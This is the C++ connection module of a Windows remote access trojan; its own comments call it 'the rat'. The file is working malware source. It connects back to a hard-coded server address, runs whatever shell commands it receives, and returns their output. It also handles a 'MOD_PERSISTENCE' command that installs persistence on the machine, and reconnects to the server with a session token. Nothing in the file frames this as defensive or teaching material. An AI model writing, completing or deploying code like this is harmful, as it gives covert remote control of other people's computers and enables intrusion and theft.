#include "../inc/Connexion.h"
#include "../inc/common.h"
#include "../inc/HandShake.h" //for reconnect
#include "../inc/ModShell.h"
#include "../inc/Persistence.h"

#include <iostream>
#include <winsock2.h>
#include <Windows.h> //sleep

using namespace std;

Connexion::Connexion()
{
    ;
} //Constructor
int Connexion::openConnexion()
{     
    if(sock_client!=0)
    {
        //If socket is live:
        //close socket and recreate other socket.
        closeConnexion(); 
    }
    WSADATA WSAData; 
    
    SOCKET sock;
    SOCKADDR_IN address_client;

//     SOCKADDR_IN address_client_tmp;
    sock_client = sock; //Find one alternativ
    cout << sock << endl;
    //cout <<"after socket sock: " <<sock_client <<endl;

    WSAStartup(MAKEWORD(2,0), &WSAData);
    
    sock_client = socket(AF_INET,SOCK_STREAM,0);
    address_client.sin_addr.s_addr= inet_addr(IP_ADDRESS);
    address_client.sin_family = AF_INET;
    address_client.sin_port = htons(PORT);
    
    while(connect(sock_client,(SOCKADDR *)&address_client, sizeof(address_client)))
    {   
        Sleep(TIMEOUT);
        //cout << "Whait...." <<endl;  
    } 
    return 0;
}

int Connexion::main(bool is_admin, string path_prog)
{   

    int i=0;
    char buffer[BUFFER_LEN];
    string command,result;
    int len_recv=0;    
    ModShell mod_shell;
    while(true)
    {
        //len_recv = recv(sock_client,buffer,sizeof(buffer), 0);
        //command.append(buffer,len_recv); 
        cout << "IN main client " << endl;
        recvSafe(command,i);

        cout << "command in main ---->" << command <<"<------------"<<endl;
        cout << "command in main ---->" << command.length() <<"<------------"<<endl;
        if(command.length() > 20)
        {
            cout << "len > 20" << endl;

            cout << command.substr(0,15) << endl;
            cout << command.substr(16,24)<< endl;
        }
        //cout << "command in main ---->" << command.substr(0,command.length()-1) <<"<------------"<<endl;
        if(command=="exit")//change 
        {
            break;
        }
        else if (command.empty())
        {
            //Connection is down.
            cout << "NADA" << endl;
        }
        else if(command == "is_life?")
        {
            ;//is life
        }
        else if(command.substr(0,2)=="cd")
        {
           ////cout << "Change directory" <<endl;
            if(mod_shell.changeDirectory(command))
            {
                result = "Error when changing folder.";
            }
            else
            {
                result = mod_shell.getPath();   
            }
            //send(sock_client,result.c_str(),strlen(result.c_str()),0);
            sendSafe(result);
        }
        else if(command.substr(0,8)=="MOD_ALL:")
        {
            if(mod_shell.exec(command.substr(8,command.length()),result))
            {
                ;
                //Error in exec.
            }
            else
            {
                ;//Good !
            }
        }
        else if (command.substr(0,15) =="MOD_PERSISTENCE:")  
        {
            //In mod persistence.
            cout << "MOD_PERSISTENCE \n\n\n" << endl;
            Persistence persistence(is_admin, path_prog);
            cout <<"STLEN OF command.substr(16,24)" << command.substr(16,24) << endl;
            if(command.substr(16,24) =="default")
            {
                cout << "Default persi" << endl;
                persistence.defaultPersi();
                cout << "[+] Persi ok " << endl;
            }
        }
        else
        {
            if(mod_shell.exec(command,result))
            {
                //cout << "error in Connexion.cpp" <<endl;
                ;
                //Error in exec.
            }
            else
            {
                cout << result << endl;
                cout << result.length() <<endl;
                result += mod_shell.getPath();
            }
            //cout << "String: "<< command << endl;
            //cout << "Size string " << command.length() << endl;
            //send(sock_client,result.c_str(),strlen(result.c_str()),0);
            //cout << "command --->" << command << endl;
            sendSafe(result);
            //cout << "Command send wala" << endl; 
            
        }
        command.erase();
        result.erase();
        i++;
//        memset(buffer,0,sizeof(buffer));
        //////cout << "erase ok !" <<endl;
    }
    return 0;
}
int Connexion::recvSafe(string &command,int i)
{
    char buffer[BUFFER_LEN];
    int len_recv=recv(sock_client,buffer,sizeof(buffer),0);

    cout << "compteur: " << i <<endl;

    if(len_recv==SOCKET_ERROR)
    {
        //cout <<"error" <<endl;
        reConnect(); //?
        //return 1;
    }
    else
    {
        //try A CHANGE !!!what():  basic_string::append
        command.append(buffer,len_recv);
        //cout << "\n\nIN recvSafe >" << command <<"<-----"<<endl;
        if(command.empty())
        {
            //If command empty re connect to server.
            //cout << "empty" <<endl;
            reConnect();
        }
    }
    return 0;
}

int Connexion::sendSafe(string data)
{
    int iResult=0;
    bool is_modulo=false;
    int len_data = data.length();
    float nb_d_envoi =  float(len_data)  / float(BUFFER_LEN);
    int i=0;

    cout << nb_d_envoi << endl;
    if(len_data > BUFFER_LEN)
    {        
        if((len_data%BUFFER_LEN)==0)
        {
            //is modulo 0 !
            ////ex 1000 ≡ 0 (mod 10)
            //you don't need to send a request again - see #!
            is_modulo = true;
            
        }
        for(i=0;i <= int(nb_d_envoi);i++)
        {
            if(i == 0)
            {
                //cout <<i <<": ----------> " << data.substr(0,BUFFER_LEN);
                iResult=send(sock_client, data.substr(0,BUFFER_LEN).c_str(), BUFFER_LEN, 0);
                checkSend(iResult);
            }
            else
            {
                iResult=send(sock_client, data.substr(BUFFER_LEN*i , BUFFER_LEN*(i+1)).c_str(),BUFFER_LEN, 0);
                checkSend(iResult);
            }
            if(int(nb_d_envoi)==i && is_modulo == false) //#!
            {
                cout << "no modulo:" << endl;
                cout << data.length() << endl;
                iResult=send(sock_client, data.substr(BUFFER_LEN*i).c_str(), strlen(data.substr(BUFFER_LEN*i).c_str()), 0);
                checkSend(iResult);
            }
        }
    }
    else
    {
        iResult = send(sock_client, data.c_str(), strlen(data.c_str()),0);
        checkSend(iResult);
    }
    
    cout << "NB request: " << i << endl;
    iResult=send(sock_client,"\r\n",2,0); // send end communication.
    checkSend(iResult);
    return 0;
    ////cout << "send ok " <<endl;
    }
void Connexion::checkSend(int &iResult)
{
    //Test if an error occurs when sending data 
    if(iResult == SOCKET_ERROR)
    {
        //cout << "error in sendSafe" << endl;
        cout << "go to reconnect !" << endl;
        reConnect();
    }
}
int Connexion::closeConnexion()
{   
    // Can be made into a code system. ex:
    // If CODE01 == data then you delete the rat so everything is element.
    // Test if it should delete itself.
    // Test if he can connect several times to the server.
    // Test if it should wait after x second (s) to reconnect to the server.

    if(closesocket(sock_client)==SOCKET_ERROR) //si object == 1 = erreur
    {
        // "Error in close socket. 
        return 1;
    }
    else
    {
        //"Close socket successful.
        WSACleanup(); //The WSACleanup function terminates use of the Winsock 2 DLL (Ws2_32.dll).
        return 0;
    }
}

void Connexion::reConnect()
{
    cout << "[+] Reconnect to server..." << endl;
    if(a_token.empty())
    {
        cout << "TOKKEN EMPTY" << endl;
    }
    else
    {
        openConnexion();
        cout << "[+] Send MOD_RECONNECT to server " << endl;
        sendUltraSafe("MOD_RECONNECT");
        cout << "[+] Send tokken to server " << endl;
        sendUltraSafe(a_token); //send token
    }

    /*
    cout << "[-] disconnect from the server" <<endl;
    openConnexion();
    cout << "Reconnect ok " << endl;
    cout << "Go to handshake in reConnect" << endl;

    HandShake hand_in_re_connect;

    hand_in_re_connect.startHandShake();
    //cout << "Connection Ok ???????" << endl;
    */

}

int Connexion::getSocket()
{
    return sock_client;
}

void Connexion::setToken(string token)
{
    cout << "SET TOKKEN IN CONNEXION"  << endl;
    a_token = token;
}



void Connexion::sendUltraSafe(string data) //TO change 
{
    int len_send=0;
    int len_recv=0;
    char buffer[BUFFER_LEN];
    string result;
    if(strlen(buffer) > 0)
    {
        //clean buffer
        cout << "Clean buffer in sendUltrasafe " << endl;
        memset(buffer, 0, sizeof(buffer));
    }
    timeval timeout;
    timeout.tv_sec = TIMEOUT_SOCK;
    timeout.tv_usec = 0;

    len_send = send(sock_client, data.c_str(), strlen(data.c_str()), 0);
    if(len_send == SOCKET_ERROR)
    {
        //error
        cout << "error " << endl;
    }
    else
    {   
        struct fd_set fds;

        FD_ZERO(&fds);
        FD_SET(sock_client, &fds);
    
        int selectSock = select(0, &fds, 0, 0, &timeout);
        if(selectSock > 0)
        {
            len_recv = recv(sock_client, buffer, sizeof(buffer), 0);
            result.append(buffer, len_recv);

            if(result == "confirmation")
            {
                ;
                //cout << "confirmation ok ! in sendUltraSafe" << endl;
            }
            
            else
            {
                cout << "ERROR in sendUltraSafe confirmation: "  << endl;
            }

        }
        else if (selectSock == 0)
        {
            //timeout
            ;        
        }
    }
    
}